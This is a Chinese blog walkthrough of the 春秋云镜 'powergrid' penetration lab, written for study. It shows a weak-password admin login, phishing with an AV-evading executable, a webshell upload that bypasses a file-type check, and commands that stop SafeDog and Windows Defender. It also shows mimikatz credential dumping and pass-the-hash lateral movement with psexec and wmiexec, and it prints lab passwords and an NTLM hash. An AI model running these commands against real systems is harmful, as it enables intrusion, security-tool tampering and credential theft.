---
title: "春秋云镜 powergrid"
onlyTitle: true
date: 2026-3-10 20:39:42
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8191.jpg
---



今天面了字节，如果能面上就贴面筋出来，不然没有

## 春秋云镜 powergrid

这次两个靶机有waf，扫的话会封ip，暂时不扫了，直接打

当时邀外援打的，榜一大哥，最后排10，赛后帮我蹭了2血，感谢c1

### flag1

第一台主机有springboot

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309173743358.png)

index.html有后台，可以admin 123456登陆

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174021164.png)

有邮箱信息

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174203921.png)

另外一台靶机可以用这里收集到的账号登陆

zs@powergrid.com 123456

联系人力有admin01

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174717471.png)

给admin01发邮件钓鱼，exe需要免杀，这里直接用的掩日的免杀

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175030705.png)

成功上线

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175022664.png)

可以dump adminstrator hash

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175328492.png)

可以转vshell，不过是windows+外网，直接添加用户rdp上去

admin桌面下有zhangsan的vpn和密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175950149.png)

账号：zhangsan
密码: tpm36H7gJchnI2qV

直接连接会连不上，在openvpn connect里把内网ip改为外网即可

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180405951.png)

分配了一个内网ip 172.27.232.2

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180426639.png)

用fping来ping扫，232网段没有主机，扩大范围可以发现16网段有主机

```
fping -agq 172.16.200.0/24
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180716395.png)

逐个扫端口，这里懒得扫了，好像又有waf的样子。老是浪费人沙砾，没意思

172.16.200.76有web服务，并且开了3389，为windows，扫目录能发现有upload.php

直接上传，修改

Content-Type: image/png

但是不能解析一句话马，直接用webshell_generate生成免杀马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191659319.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191714299.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191752478.png)

但是有杀软，执行命令就会ret=-1，但是看到是php7了，随便找一个免杀shell

https://github.com/misaka19008/PerlinPuzzle-Webshell-PHP

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310194912977.png)

用de5查询杀软进程，执行`TaSKLIst^/F"O" C"s"v`（点击查看源代码可以分行）

https://av8.de5.net/

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310195250800.png)

发现有安全狗和阿里云盾，这个阿里云盾好像是杀不了的，关安全狗和windows Defender就行了

```
net stop SafeDogGuardCenter
net stop "Safedog Update Center"
net stop SafeDogCloudHelper
taskkill /F /PID 2820
taskkill /F /PID 2872
taskkill /F /PID 2880
taskkill /F /PID 8756

powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
net stop WinDefend
net stop WdNisSvc

```

此时shell就能执行代码了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310195729451.png)

加个账户rdp上去，因为直接传mimikatz发现老是传不上去，估计windows杀毒还没关掉，rdp上去再说，但是说是未授权远程登陆

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310200303544.png)

噢噢，原来只有uploads目录有限制，在public目录下顺利上传了

dump内存先

`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310200905369.png)

不过只看到bigdata用户

从SAM数据库dump：

`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310201625273.png)

也是找到admin hash da6df1961007afa067bde06c602ea1f8

psexec横向上去

```
python psexec.py administrator@172.16.200.78 -hashes :da6df1961007afa067bde06c602ea1f8 -codec gbk
```

额，卡住了，慢的刘农

好像psexec不行

```
python wmiexec.py administrator@172.16.200.78 -hashes :da6df1961007afa067bde06c602ea1f8 -codec gbk
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310202505598.png)

administrator文件夹有flag

`C:\Users\Administrator\Desktop\larkmt-admin\conf\application.yml` 发现数据库信息，用的mysql

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310202845688.png)

```
    username: root
    password: rjS8K2RW7KE4E1vk
    url: jdbc:mysql://172.16.200.81:3306/web?serverTimezone=Asia/Shanghai&useLegacyDatetimeCode=false&useSSL=false&nullNamePatternMatchesAll=true&useUnicode=true&characterEncoding=UTF-8
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310203100002.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310203230981.png)

自己md5吧，溜了，做一下两年没做过的排序去